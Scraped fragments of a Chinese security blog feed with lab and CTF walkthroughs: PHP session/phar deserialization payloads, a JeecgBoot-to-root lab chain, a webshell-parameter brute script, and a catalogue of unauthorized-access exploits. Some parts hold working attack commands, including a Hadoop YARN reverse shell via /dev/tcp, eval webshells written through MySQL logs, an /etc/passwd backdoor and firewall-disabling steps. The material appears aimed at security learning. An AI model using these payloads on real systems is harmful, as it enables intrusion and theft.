1?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;} session反序列化当seesion_start()被调用或者php.ini中session.auto_start为1时PHP内部调用会话管理器，访问用户session被序列化以后，存储到指定目录（默认为/tmp)。 存取数据的格式有多种，常用的有三种漏洞的产生：写入和读取的格式不一样 1benben|s:6:&quot;1234565&quot;; php_serialize序列化 1234&lt;?phpsession_start();$_SESSION['benben']=$_GET['ben'];?&gt; 漏洞是怎么来的? 1只要有一个类为D 它的值就可以为序列化 php 1234567&lt;?php class D{ var $a=&quot;system('whoami');&quot;; } echo serialize(new D()); ?&gt;/class20/save.php?a=|O:1:&quot;D&quot;:1:{s:1:&quot;a&quot;;s:17:&quot;system(%27whoami%27);&quot;;} 然后直接到vul.php刷新就能看到执行命令了 session例题123456789101112131415161718192021222324252627282930313233&lt;?phphighlight_file(__FILE__);/*hint.php*/session_start();class Flag{ public $name; public $her; function __wakeup(){ $this-&gt;her=md5(rand(1, 10000)); // her被赋值随机md5值 if ($this-&gt;name===$this-&gt;her){ // 要求name和her完全相等 include('flag.php'); echo $flag; } }}?&gt;# hint.php&lt;?php highlight_file(__FILE__); error_reporting(0); ini_set('session.serialize_handler', 'php_serialize'); session_start(); $_SESSION['a'] = $_GET['a']; ?&gt;&lt;?php class Flag{ public $name; public $her; } $a = new Flag(); $a-&gt;name =&amp;$a-&gt;her; echo serialize($a);O:4:&quot;Flag&quot;:2:{s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;} 「引用赋值绕过随机校验」+「session 序列化处理器传递恶意对象」+「魔术方法__wakeup 触发逻辑」 还可以结合文件上传来考 phar反序列化phar是php一个压缩包，类似jar包 5.3或高版本可以读phar伪协议可以读取.phar文件 stub phar文件格式，格式为 1234xxx&lt;?php xxx;__HALT_COMPiLER;?&gt;;mainfest压缩文件的属性等信息，以序列化存储contents压缩文件的内容signature签名，放在文件尾 漏洞页面 123456789101112131415&lt;?php highlight_file(__FILE__); error_reporting(0); class Testobj { var $output=&quot;echo 'ok';&quot;; function __destruct() { eval($this-&gt;output); } } if(isset($_GET['filename'])) // 关键触发点{ $filename=$_GET['filename']; var_dump(file_exists($filename)); } ?&gt; 下面这个payload要上传一个phar文件这里他直接点那个生成就给你上传了 1?filename=phar://test.phar&amp;a=system(%27whoami%27); 生成phar代码 123456789101112131415161718&lt;?php class Testobj { var $output=''; } @unlink('test.phar'); //删除之前的test.par文件(如果有) $phar=new Phar('test.phar'); //创建一个phar对象，文件名必须以phar为后缀 $phar-&gt;startBuffering(); //开始写文件 $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); //写入stub $o=new Testobj(); $o-&gt;output='eval($_GET[&quot;a&quot;]);'; $phar-&gt;setMetadata($o);//写入meta-data $phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;); //添加要压缩的文件 $phar-&gt;stopBuffering(); ?&gt;//Metadata 段：存储了Testobj类的实例，且该实例的output属性值为 eval($_GET[&quot;a&quot;]);（核心恶意代码模板） phar修改成任何后缀都不影响解析对具体的题目 phar使用条件 1234phar能上传到服务器端要有可用反序列化魔术方法作为跳板要有文件操作函数，入file_exits(),fopen(),file_get_contents()文件操作函数参数可控，且:、/、phar等特殊字符没被过滤 phar例题 把phar后缀改成png任然可以解析读取这个文件自动触发链子","link":"/2025/12/17/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"},{"title":"","text":"春秋云镜Finance–外网打靶 信息收集12fscan -h 39.101.71.180nmap 8.145.35.203 -p 22,80,3306,8081 -sCV 发现22,80,3306,8081都是开着的得到8081有JeecgBoot JeecgBoot web8081这里直接用工具扫一下扫到ssti 利用JeecgBoot jmreport/loadTableData SSTI模板注入漏洞 执行命令，但这个命令执行受限，我只要用一些特殊符号就报错，而且命令返回长度有限 通过PWD命令获取到当前网站工作目录，扫描的时候发现存在mysql,大概率网站配置文件中存在Mysql连接的相关配置信息，翻找目录并没有找到有用的配置文件。 在工作目录下可以发现有一个jar包，这个网站大概率是用这个jar包运行的， 直接用cp命令把这个jar包放到80端口网站目录 /var/www/html 下，然后访问路径即可下载这个jar包 显示失败但是是成功执行了的 下载好后，直接解压这个jar包，全局搜索3306马上就能找到mysql的配置信息 mysql利用username: rootpassword: oZOgpwlvgh2N01eS然后利用mdut 连接数据库GitHub - DeEpinGh0st/MDUT-Extend-Release: MDUT-Extend(扩展版本) 这里用Udf提权开启命令执行，然后写一个特权账户到 /etc/passwd 123456┌──(root㉿kali)-[~/Desktop/ChunQiu/Finance]└─# openssl passwd -6 123123 #生成密码hash$6$QrMcMXsfxBnF/K4m$xWsqsAYqpZEX649U/O5RqIzCUkjknjFzuvBksmKNz8r4L13zgWVW/Y3bs7jteMvSgAF7dVDtsPhfizTDKyPmD0#写到/etc/passwd （这里哈希密码有很多特殊符号用base64编码后写入）echo YzF0cnVzOiQ2JGlqL1o4Y3FxYXdPQTJzR2skYW1EVzVWZnhJMklsUURUem1lRG9XYTFKZlRJYjBsTm8yVGFMc3E3c3JsTWNEWFFiV1k3dUNJaE1zZWE0SE8uN2dQSDFxcVUyQkI3THZlN2p6Ny5WWTA6MDowOnJvb3Q6L2hvbWUvYzF0cnVzOi9iaW4vYmFzaA== |base64 -d&gt;&gt; /etc/passwd 生成hash的时候这里去你的kali上执行，去它那个服务器跑不了 PS: 我感觉写 /etc/passwd 这一步可能也可以在Jeecgboot的利用工具中完成，但是我没成功过xshell链接拿到第一个flag 内网代理(第一层)进来后先看下网络连接，可以发现有个redis的docker，但里面没有什么东西，此外mysql数据库里面也是没有什么东西的然后看一下网卡信息,看看内网网段 1234567891011121314151617181920212223242526272829303132333435root@web01:/# ifconfigdocker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 inet6 fe80::42:e2ff:fe68:591a prefixlen 64 scopeid 0x20&lt;link&gt; ether 02:42:e2:68:59:1a txqueuelen 0 (Ethernet) RX packets 797 bytes 36609 (36.6 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 805 bytes 48471 (48.4 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.22.10.22 netmask 255.255.255.0 broadcast 172.22.10.255 inet6 fe80::216:3eff:fe06:4124 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:3e:06:41:24 txqueuelen 1000 (Ethernet) RX packets 91570 bytes 9390063 (9.3 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 95309 bytes 218743007 (218.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 27655 bytes 8040046 (8.0 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 27655 bytes 8040046 (8.0 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0veth0eeff78: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::60fc:52ff:fea9:61d7 prefixlen 64 scopeid 0x20&lt;link&gt; ether 62:fc:52:a9:61:d7 txqueuelen 0 (Ethernet) RX packets 797 bytes 47767 (47.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 820 bytes 49617 (49.6 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ph4ntonn/Stowaway：👻Stowaway ——渗透测试者的多跳代理工具 1netstat -lntp 123456789#（靶机web01执行）root@web01:/# chmod +x linux_x64_agent root@web01:/# ./linux_x64_agent -l 222025/11/15 02:25:19 [*] Starting agent node passively.Now listening on port 22 #(你的VPS执行)# ./linux_x64_admin -c $靶机IP:22 (admin) &gt;&gt; use 0(node 0) &gt;&gt; socks 9999 这样就行搭好代理了，可以通过 vpsIP:9999 作为跳板访问到内网10网段 在kali上配置 /etc/proxychains4.conf 通过proxychains来使用代理 windows上使用proxyfier配置来使用代理 (地址为你的vps IP) 内网扫描上传Fscan到web01对内网10网段进行扫描 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152root@web01:/root# ./FScan_2.0.1_linux_x64 -h 172.22.10.22/24┌──────────────────────────────────────────────┐│ ___ _ ││ / _ \\ ___ ___ _ __ __ _ ___| | __ ││ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / ││ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; ││ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │└──────────────────────────────────────────────┘ Fscan Version: 2.0.1[1.8s] 已选择服务扫描模式[1.8s] 开始信息扫描[1.8s] CIDR范围: 172.22.10.0-172.22.10.255[1.8s] generate_ip_range_full[1.8s] 解析CIDR 172.22.10.22/24 -&gt; IP范围 172.22.10.0-172.22.10.255[1.9s] 最终有效主机数量: 256[1.9s] 开始主机扫描[1.9s] 使用服务插件: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[1.9s] [*] 目标 172.22.10.22 存活 (ICMP)[1.9s] [*] 目标 172.22.10.17 存活 (ICMP)[1.9s] [*] 目标 172.22.10.253 存活 (ICMP)[1.9s] [*] 目标 172.22.10.88 存活 (ICMP)[4.9s] 存活主机数量: 4[4.9s] 有效端口数量: 233[4.9s] [*] 端口开放 172.22.10.22:6379[4.9s] [*] 端口开放 172.22.10.22:80[4.9s] [*] 端口开放 172.22.10.22:3306[4.9s] [*] 端口开放 172.22.10.22:8081[4.9s] [*] 端口开放 172.22.10.22:8080[4.9s] [*] 端口开放 172.22.10.17:22[4.9s] [*] 端口开放 172.22.10.88:21[4.9s] [*] 端口开放 172.22.10.88:80[4.9s] [*] 端口开放 172.22.10.88:445[4.9s] [*] 端口开放 172.22.10.88:139[4.9s] [*] 端口开放 172.22.10.88:135[7.9s] 扫描完成, 发现 11 个开放端口[7.9s] 存活端口数量: 11[7.9s] 开始漏洞扫描[7.9s] [*] NetInfo 扫描结果目标主机: 172.22.10.88主机名: web02发现的网络接口: IPv4地址: └─ 172.22.10.88[7.9s] [*] 网站标题 http://172.22.10.22 状态码:200 长度:14323 标题:FinancePro ERP系统[8.0s] [+] NetBios 172.22.10.88 WORKGROUP\\WEB02 [8.0s] [*] 网站标题 http://172.22.10.88 状态码:403 长度:199 标题:403 Forbidden[8.0s] POC加载完成: 总共387个，成功387个，失败0个[8.1s] [+] FTP服务 172.22.10.88:21 匿名登录成功![8.1s] [*] 网站标题 http://172.22.10.22:8080 状态码:404 长度:682 标题:HTTP Status 404 – Not Found[8.1s] [*] 网站标题 http://172.22.10.22:8081 状态码:200 长度:1766 标题:&quot;&quot;[36.6s] 扫描已完成: 18/18","link":"/2025/12/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFinance--%E5%A4%96%E7%BD%91%E6%89%93%E9%9D%B6/"},{"title":"","text":"强网杯2019–高明的黑客 拿到很多奇怪的东西，跑脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import requestsimport osimport reurl = 'http://7f163133-d226-4d67-bffa-9c2366d4eab3.node5.buuoj.cn:81/'path = r'C:\\Users\\11759\\Downloads\\Compressed\\sss'ptn_get = re.compile(br&quot;\\$_GET\\['(\\w+)'\\]&quot;) #匹配文件里面的GET内容flag_ptn = re.compile(br&quot;\\{.*?\\}&quot;)print(&quot;========== 开始扫描 ==========\\n&quot;)for f in os.scandir(path): if not f.is_file() or not f.name.endswith(&quot;.php&quot;): continue print(f&quot;[+] 扫描文件：{f.name}&quot;) with open(f.path, &quot;rb&quot;) as fp: content = fp.read() params = set(ptn_get.findall(content)) if not params: continue for p in params: p = p.decode() print(f&quot; [+] 测试参数：{p}&quot;) try: r = requests.get( url + f.name, params={p: &quot;cat /flag&quot;}, timeout=8 ) except: continue if flag_ptn.search(r.content): print(&quot;\\n漏洞发现！&quot;) print(f&quot;文件：{f.name}&quot;) print(f&quot;参数：{p}&quot;) print(f&quot;PoC：{url}{f.name}?{p}=cat /flag&quot;) print(&quot;\\nflag:&quot;) print(r.text) exit()print(&quot;\\n========== 扫描结束：未发现命令执行 ==========&quot;)直接获取payload如下/xk0SzyKwfzw.php?Efa5BVG=cat /flag","link":"/2025/12/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019--%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"},{"title":"","text":"父子域搭建 父域：sky0.com dc主域控：192.168.64.11 pc成员域控：192.168.64.12 12345678910子域：hr.sky0.com dc:子域控 192.168.64.22 pc：成员主机 192.168.139.23子域：pc.sky0.com dc:子域控 192.168.64.33 pc：成员主机 192.168.64.34 域林：ga.sky0.com dc 孙子域控 192.168.64.36 pc 成员主机 192.168.64.36 父域：sky.com dc 子域控 192.168.64.44 pc 成员主机 192.168.64.45","link":"/2025/12/11/%E7%88%B6%E5%AD%90%E5%9F%9F%E6%90%AD%E5%BB%BA/"},{"title":"","text":"未授权漏洞利用 简介未作限制，普通用户能垂直越权什么的 未授权访问，在不进行请求授权的情况下对需要权限的功能进行访问执行。通常是由于认证存在缺陷、无认证或安全配置不当导致。常见于服务端口，接口未限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能。 FTP 未授权访问 端口：21 介绍：FTP服务端配置anymouns 可登录，则可直接使用user为anymouns，不输入密码直接可登录到FTP 漏洞利用：直接访问ftp路径：ftp://ip:port/，或终端登录，输入user为anymouns LDAP 未授权访问 端口：389 介绍：LDAP 底层一般使用 TCP 或 UDP 作为传输协议。目录服务是一个特殊的数据库，是一种以树状结构的目录数据库为基础。未对LDAP的访问进行密码验证，导致未授权访问，存储和查询 “目录型数据” 的网络协议 漏洞利用：工具连接 rsync 未授权访问 端口：873 介绍：rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件 漏洞利用：https://vulhub.org/#/environments/rsync/common/ rsync rsync://your-ip:873/src/ 列出目录 rsync -av rsync://your-ip:873/src/etc/passwd ./ 下载文件 rsync -av shell rsync://your-ip:873/src/etc/cron.d/shell 上传文件 ZooKeeper 未授权访问 端口：2181 介绍：ZooKeeper 是一个分布式的开放源码的分布式应用程序协调服务，ZooKeeper 默认开启在 2181 端口在未进行任何访问控制的情况下攻击者可通过执行 envi 命令获得系统大量的敏感信息包括系统名称Java 环境，任意用户在网络可达的情况下进行为未授权访问并读取数据甚至 kill 服务。 漏洞利用： echo envi| nc xxx.xxx.xxx.xxx 2181 获取服务器环境信息 echo stat | nc 192.168.131.128 2181 Docker 未授权访问 端口：2375 介绍：Docker API可以执行Docker命令，在未授权的情况下可以执行docker命令 漏洞利用：https://vulhub.org/#/environments/docker/unauthorized-rce/ Docker Registry 未授权访问 端口：5000 介绍：docker remote api可以执行docker命令 漏洞利用： curl -k -XGET https://xxx.xxx.xxxx/v2/_catalog 查询catalog curl -k -XGET https://xxx.xxx.xxx/v2/&lt;image&gt;/tags/list查询tags Kibana 未授权访问 端口: 5001 介绍：Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成数据泄露。 漏洞利用： 直接访问kibana的页面 VNC未授权访问 端口：5900, 5901 介绍：VNC 是虚拟网络控制台Virtual Network Console的英文缩写。它是一款优秀的远程控制工具软件由美国电话电报公司AT&amp;T的欧洲研究实验室开发。VNC是基于 UNXI 和 Linux 的免费开源软件由 VNC Server 和 VNC Viewer 两部分组成。VNC 未授权访问漏洞如被利用可能造成恶意用户直接控制受控主机危害相当严重 漏洞利用：下载VNC® Viewer，并连接，这个要结合其他漏洞利用，不然还是挺难利用的 CouchDB 未授权访问 端口：5984 介绍：Apache CouchDB 是一个开源数据库，默认会在5984端口开放Restful的API接口，如果使用SSL的话就会监听在6984端口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。 漏洞利用：curl xxx.xxx.xxx.xxx:5984/_config Apache Spark 未授权访问 端口：6066, 8081,8082 介绍：Apache Spark是一款集群计算系统，其支持用户向管理节点提交应用，并分发给集群执行。如果管理节点未启动访问控制，攻击者可以在集群中执行任意代码。该漏洞的本质是未授权用户可以向Master节点提交一个应用，Master节点会分发给Slave节点执行应用。如果应用中包含恶意代码，会导致任意代码执行，威胁Spark集群整体的安全性。 漏洞利用：使用msf工具getshell 123456789msf5&gt;use exploit/linux/http/spark_unauth_rcemsf5&gt;set payload java/meterpreter/reverse_tcpmsf5&gt;set rhost xxx.xxxx.xxxxmsf5&gt;set rport 6066msf5&gt;set lhost xxx.xxx.xxx.xxxmsf5&gt;set lport 4444msf5&gt;set srvhost xxx.xxx.xxx.xxxmsf5&gt;set srvport 8080msf5&gt;exploit Redis 未授权访问 端口：6379 介绍：redis是一个数据库，默认端口是6379，redis默认是没有密码验证的，可以免密码登录操作，攻击者可以通过操作redis进一步控制服务器。 Redis未授权访问在4.x/5.0.5以前版本下，可以使用master/slave模式加载远程模块，通过动态链接库的方式执行任意命令 漏洞利用：redis-cli远程连接 Weblogic 未授权访问 端口：7001 介绍：Weblogic是Oracle公司推出的J2EE应用服务器，CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台。 CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。 漏洞利用： http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252fconsole.portal进入后台 Hadoop YARN 未授权访问 端口：8088 介绍：Hadoop是一款由Apache基金会推出的分布式系统框架，它通过著名的MapReduce算法进行分布式处理，Yarn是Hadoop集群的资源管理系统。此次事件主要因HadoopYARN资源管理系统配置不当，导致可以未经授权进行访问，从而被攻击者恶意利用。攻击者无需认证即可通过RESTAPI部署任务来执行任意指令，最终完全控制服务器。 漏洞利用 12345678910111213141516171819#!/usr/bin/env pythonimport requeststarget = 'http://xxx.xxx.xxx.xxx:8088/' # 设置目标主机的ip地址lhost = 'xxx.xxx.xxx.xxx' # 设置你攻击主机的监听ip地址，并且监听端口为9999url = target + 'ws/v1/cluster/apps/new-application'resp = requests.post(url)app_id = resp.json()['application-id']url = target + 'ws/v1/cluster/apps'data = { 'application-id': app_id, 'application-name': 'get-shell', 'am-container-spec': { 'commands': { 'command': '/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1' % lhost, }, }, 'application-type': 'YARN',}requests.post(url, json=data) JBoss 未授权访问 端口：8080 介绍：JBOSS 企业应用平台EAP是 J2EE 应用的中间件平台。默认情况下访问 http://ip:8080/jmx-console，就可以浏览 Jboss 的部署管理的信息不需要输入用户名和密码可以直接部署上传木马有安全隐患。 漏洞利用： 同tomcat manager Jenkins 未授权访问 端口：8080 介绍：默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。 漏洞利用：未授权访问 http://&lt;target&gt;:8080/script，可以执行系统命令 Kubernetes Api Server 未授权 端口：8080,10250 介绍：Kubernetes 的服务在正常启动后会开启两个端口：Localhost Port （默认8080）、Secure Port （默认6443）。这两个端口都是提供 Api Server 服务的，一个可以直接通过 Web 访问，另一个可以通过 kubectl 客户端进行调用。如果运维人员没有合理的配置验证和权限，那么攻击者就可以通过这两个接口去获取容器的权限。 漏洞利用： http://xxx.xxx.xxx.xxx:8080/ 可以看到路由信息 10250端口是kubelet API的HTTPS端口，通过路径:https://xxx.xxx.xxx.xxx/10250/pods获取环境变量、运行的容器信息、命名空间等信息 Active MQ 未授权访问 端口：8161 介绍：ActiveMQ 是一款流行的开源消息服务器。默认情况下，ActiveMQ 服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。 漏洞利用： 默认口令：admin/admin Jupyter Notebook 未授权访问 端口：8888 介绍：Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。 漏洞利用： 访问http://xxx.xxx.xxx.xxx:8888，将看到Jupyter Notebook的Web管理界面，并没有要求填写密码 选择 new -&gt; terminal 即可创建一个控制台 直接执行任意命令 Elasticsearch 未授权访问 端口：9200,9300 介绍：Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口或者9300端口，可被非法操作数据。 漏洞利用： 直接访问http://xxx.xxx.xxx.xxx:9200 _cat/indices _river/_search 数据库信息 _nodes 节点信息 _plugin/head （有head插件的情况下） Zabbix 未授权访问 端口：10051 介绍：zabbix是一款服务器监控软件，默认服务开放端口为10051，其由server、agent、web等模块组成，其中web模块由PHP编写，用来显示数据库中的结果。 漏洞利用 无需账户密码直接访问zabbix页面 RabbitMQ 未授权访问 端口：15672,15692,25672 介绍：RabbitMQ是目前非常热门的一款消息中间件，基于AMQP协议的，可以在发布者和使用者之间交换异步消息。消息可以是人类可读的JSON，简单字符串或可以转换为JSON字符串的值列表。 漏洞利用： 默认账号密码都是guest MongoDB 未授权访问 端口：27017 介绍：开启MongoDB服务时不添加任何参数时,默认是没有权限验证的,登录的用户可以通过默认端口无需密码对数据库任意操作（增、删、改、查高危动作）而且可以远程访问数据库。 漏洞利用： 使用数据库连接工具 如navicat 等直接连接 NFS 未授权访问 端口：2049，20048 介绍：NetworkFileSystem(NFS)，是由SUN公司研制的UNIX表示层协议(pressentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。服务器在启用nfs服务以后，由于nfs服务未限制对外访问，导致共享目录泄漏 漏洞利用： 安装nfs客户端 nfs-common 查看nfs服务器上的共享目录 showmount -e xxx.xxx.xxx.xxx 挂载相应共享目录到本地 mount -t nfs xxx.xxx.xxx.xxx:/grdata /mnt Dubbo 未授权访问 端口：28096 介绍：Dubbo是阿里巴巴公司开源的一个高性能优秀的 服务框架，使得应用可通过高性能的 RPC 实现服务的输 出和输入功能，可以和 Spring框架无缝集成。dubbo 因配置不当导致未授权访问漏洞 漏洞利用：telnet ip port Druid 未授权访问 端口：/ 介绍：Druid是阿里巴巴数据库出品的，为监控而生的数据库连接池，并且Druid提供的监控功能，监控SQL的执行时间、监控Web URI的请求、Session监控，首先Druid是不存在什么漏洞的。但当开发者配置不当时就可能造成未授权访问 漏洞利用： /druid/index.html /druid/websession.html /druid/datasource.html /druid/sql.html /druid/spring.html Solr 未授权访问 端口：443,8443 介绍：Solr是一个高性能，采用Java开发，基于Lucene的全文搜索服务器。solr的管理界面通常包含如下信息：solr的配置信息（包括路径，用户名，系统版本信息），数据库的配置信息（地址，用户名，密码），数据库搜索数据等。solr未授权访问的危害很大，轻则可查询所有数据库信息，重则可读取系统任意文件，甚至getshell 漏洞利用 /solr/admin SpringBoot Actuator 未授权访问 端口：/ 介绍：Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。 漏洞利用： /actuator/autoconfig /actuator/env /actuator/dump /actuator/headdump 可下载 SwaggerUI未授权访问漏洞 端口：/ 介绍：Swagger 是一个规范且完整的框架，用于生成、描述、调用和可视化 RESTful 风格的 Web 服务。 漏洞利用： swagger-ui未直接部在IP根目录下 直接访问 Harbor未授权添加管理员漏洞 端口：/ 介绍：Harbor未授权添加任意管理员漏洞。攻击者可通过构造特定的字符串，在未授权的情况下直接创建管理员账号，从而接管Harbor镜像仓库 漏洞利用： /harbor/sign-in 注册管理员 像我们实验室的内部系统就是用的这个仓库，功能就是把docker打包的镜像传上去","link":"/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/"},{"title":"","text":"红日靶场+METASPLOITABLE打靶 红日靶场一先扫网段 1nmap -sn -PR -n 192.168.52.0/24 -sn: 跳过端口扫描，只确认是否在线-PR: 使用基于 ARP 协议的主机扫描，内网首选-n: 不进行反向 DNS 解析，可提高扫描速度 然后按级别到10扫端口 1sudo nmap -sS -sC -Pn -n -sV -p 1-65535 192.168.52.10 -sS: 使用 TCP SYN 半开放扫描 (必须使用 root 权限运行)-sC: 使用默认的脚本扫描，可扫描出更多信息 (比如网页标题)-Pn: 不进行活跃主机扫描，因为扫描对象已知是活跃主机-n: 不进行反向 DNS 解析，提高扫描速度-sV: 扫描服务版本信息-p 1-65535: 指定扫描的端口范围为所有 TCP 端口80端口 从上图可看出 192.168.52.10 主机开放了 80 端口，运行了 HTTP 服务，站点标题为 phpStudy，即使用小皮面板搭建的 web 站点。浏览器访问 http://192.168.1.10，可以看到 phpinfo.php 文件被展示了出来，可被收集到大量 PHP 配置信息： 2.1.3 站点目录扫描使用 wfuzz 来扫描 http://192.168.52.10/ 的站点目录： 1wfuzz -w /usr/share/wordlists/dirb/common.txt --hc 404 http://192.168.52.10/FUZZ -w /usr/share/wordlists/dirb/common.txt: 指定 wfuzz 使用 kali 内置的常见目录和文件名字典文件来爆破--hc 404: hide code 404，即当返回状态码为 404 (未找到) 时，wfuzz 不显示该结果192.168.52.10/FUZZ: FUZZ 为占位符，字典文件中的每一行都会替换掉 FUZZ，并将替换后的 URL 发送给服务器，然后分析服务器的 http 状态码 /phpadmin弱密码root.root 1wget http://192.168.52.10/beifen.rar 这里直接告诉我们后台地址了源码中也可以看到因为直接拿源码了太简单了在留言板/index.php?r=default/extend/index&amp;id=100023页面输入 12hello admin!!&lt;script&gt;alert(&quot;hacker&quot;)&lt;/script&gt; 构成xss 单击审核按钮，使该留言通过审核从而显示在留言板页面：然后用户界面就会弹窗了 yxcms 后台文件上传漏洞 登录到 yxcms 的后台，进入” 前台模板”，管理模板文件并新建模板文件，名称为 hack, 内容为 php 一句话木马: &lt;?php @eval($_POST['hack']);?&gt;: 但是不知道文件位置这里我们直接去但是我们有源码可以知道这个页面其他文件的位置yxcms\\protected\\apps\\default\\view\\default 得到文件路径 1http://192.168.52.10/yxcms/protected/apps/default/view/default/HACK.php 然我们直接去antsword连接 net sessionnet session 命令的核心作用是展示 “会话连接”，具体能查到以下关键信息： 远程计算机名称 / IP：显示哪个设备（比如另一台电脑、服务器）正在连接你的电脑。 连接类型：通常是 “Microsoft Windows Network”，即通过 Windows 网络共享建立的连接。 连接状态：显示连接是 “已建立” 还是 “断开” 等状态。 登录用户名：显示远程设备用哪个账号登录到你的电脑（仅部分场景显示）。 到phpadmin访问写一句话 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot; INTO OUTFILE &quot;C:\\Users\\Administrator\\Desktop\\phpStudy\\WWW\\hack.php&quot;; 命令执行后出现了报错，提示 MySQL 服务器配置了 secure-file-priv 选项，限制了该命令的执行，执行以下命令查询该选项的状态： 1SHOW GLOBAL VARIABLES LIKE &quot;%secure%&quot;; 从上图可知 secure-file-priv 选项被设置为了 NULL, MySQL 服务器会禁止文件导入与导出功能。尝试使用以下命令修改 secure-file-priv 选项的值为空字符，使其不做目录限制: 1SET GLOBAL secure_file_priv = ''; 现在该变量为只读，无法修改尝试从 MySQL 命令执行日志下手，执行 SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;;，查看命令执行日志开关和日志文件路径： 12SET GLOBAL general_log=on; SET GLOBAL general_log_file='C:/Users/Administrator/Desktop/phpStudy/WWW/hack.php'; 命令执行会自动在命令后面加上注释提示返回结果。执行 SHOW GLOBAL VARIABLES LIKE &quot;%general_log%&quot;; 手动验证一下： 从上图可知修改成功。后面执行的所有 MySQL 命令都会被记录在网站根目录下的 hack.php 文件中 (只记录命令，不记录结果)，此时再执行以下命令将一句话木马记录到日志文件中： 1SELECT &quot;&lt;?php @eval($_POST['hack']);?&gt;&quot;; 内网打靶先传cs马🐎到服务器上，然后直接点鼠标就提权成功了 这里我们接看密码输入 1logonpasswords 得到上图后直接去就得到了密码从上图可以看到 administrator 用户的登录密码为 admin123!, 所属域为 god, 密码来源为 mimikatz 工具。 查询远程桌面控制 (RDP) 3389 端口是否启用： 1shell netstat -ano | findstr 3389 输出为空行，说明未启用，使用此命令开启 RDP： 1shell REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f 操作成功，再次执行 shell netstat -ano | findstr 3389 验证结果： 启用成功。WIN+R 打开运行窗口输入 mstsc.exe 回车打开 RDP 客户端程序，使用 god/administrator 用户连接服务器的远程桌面：这里是GOD\\Administrator发现连接失败，namp扫一下 1nmap -Pn -n -p 3389 192.168.52.10 发现端口为 filtered 被过滤状态，说明可能存在防火墙拦截，执行 shell netsh advfirewall show allprofiles 命令查看防火墙状态： 从上图可看到防火墙状态为打开且拦截了入站数据，执行 shell netsh advfirewall set allprofiles state off 命令尝试关闭服务器的防火墙 (或者执行此命令单独放行 RDP 流量 netsh advfirewall firewall add rule name=&quot;Allow Remote Desktop&quot; action=allow dir=in protocol=TCP localport=3389)： 执行成功，再次验证配置：shell 